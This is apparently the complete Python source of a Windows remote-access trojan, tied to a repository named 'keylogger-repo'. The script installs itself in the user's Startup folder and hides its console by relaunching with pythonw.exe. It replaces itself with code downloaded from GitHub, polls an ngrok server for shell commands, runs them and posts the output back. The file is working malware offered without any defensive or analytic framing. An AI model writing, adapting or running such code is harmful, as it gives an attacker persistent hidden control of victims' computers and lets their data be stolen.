import requests, os, subprocess, time, hashlib, shutil, sys

# Use the ngrok URL for the remote server
ngrok_url = 'https://56e3-120-151-185-163.ngrok-free.app'
update_url = 'https://raw.githubusercontent.com/JJcoded/keylogger-repo/refs/heads/main/client.py'
startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
script_path = os.path.abspath(sys.argv[0])

def add_to_startup():
    if not os.path.exists(os.path.join(startup_dir, os.path.basename(script_path))):
        shutil.copy(script_path, startup_dir)
        print(f"Added {script_path} to startup.")

def check_for_update():
    # Hash the current script
    with open(script_path, 'rb') as file:
        current_script_hash = hashlib.md5(file.read()).hexdigest()

    # Fetch the latest version from GitHub
    response = requests.get(update_url)
    latest_script_content = response.content

    # Hash the latest script
    latest_script_hash = hashlib.md5(latest_script_content).hexdigest()

    # Compare hashes, if different, update the script
    if current_script_hash != latest_script_hash:
        with open(script_path, 'wb') as file:
            file.write(latest_script_content)
        print("Script updated. Restarting...")
        os.execl(sys.executable, sys.executable, *sys.argv)

def main():
    add_to_startup()
    
    while True:
        check_for_update()  # Check for updates
        req = requests.get(ngrok_url)
        c2_command = req.text
        if 'terminate' in c2_command:
            break
        else:
            CMD = subprocess.Popen(c2_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            post_response = requests.post(url=ngrok_url, data=CMD.stdout.read())
        
        time.sleep(10)  # Adjust the sleep time as needed

if __name__ == "__main__":
    if not sys.executable.endswith('pythonw.exe'):
        # Relaunch with pythonw.exe if not already running with it
        pythonw_path = sys.executable.replace('python.exe', 'pythonw.exe')
        os.execl(pythonw_path, pythonw_path, *sys.argv)
    else:
        main()
